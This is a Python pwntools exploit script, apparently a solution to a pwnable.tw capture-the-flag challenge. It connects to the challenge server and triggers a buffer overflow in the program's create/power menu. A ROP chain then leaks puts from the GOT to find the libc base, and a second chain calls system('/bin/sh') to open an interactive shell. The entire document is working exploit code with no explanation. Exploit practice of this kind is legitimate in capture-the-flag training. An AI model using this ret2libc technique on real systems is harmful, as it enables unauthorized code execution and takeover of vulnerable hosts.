from pwn import *
io = remote('chall.pwnable.tw',10103)
#io = remote('127.0.0.1',4000)
def create(data):
    io.recvuntil(' :')
    io.sendline('1')
    io.recvuntil(' :')
    io.send(data)
    io.recvuntil(' : ')
    return int(io.recvline()[:-1],10)

def power(data):
    io.recvuntil(' :')
    io.sendline('2')
    io.recvuntil(' :')
    io.send(data)
    io.recvuntil(' : ')
    return int(io.recvline()[:-1],10)

def beat():
    io.recvuntil(' :')
    io.sendline('3')
#    io.recvuntil('choice :')
#    io.sendline('4')

#add_esp = 0x08048472
pop_ebx = 0x08048475
puts_plt = 0x80484a8
puts_got = 0x804afdc
main = 0x8048954
#offset = 0x18660

print(create('A'*0x2f+'\x00'))
print(power('A'))
# in puts_plt: pop_ebx is retaddr and puts_got is para
# in pop_ebx esp change to &main, so return to main
print(power('\xff\xff\xff' + p32(0x0804b880) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got) + p32(main)))
#raw_input()
beat()

io.recvuntil('win !!\n')
puts_libc = u32(io.recvline()[:-1].ljust(4,'\x00'))
libc_base = puts_libc - 0x5f140
system_libc = libc_base + 0x3a940
binsh = libc_base + 0x158e8b

print(hex(libc_base))
print('===second round===')
print(create('A'*0x2f + '\x00'))
print(power('A'))
print(power('\xff\xff\xff' + p32(0x804b880) + p32(system_libc) + p32(binsh)*2))
beat()

io.interactive()

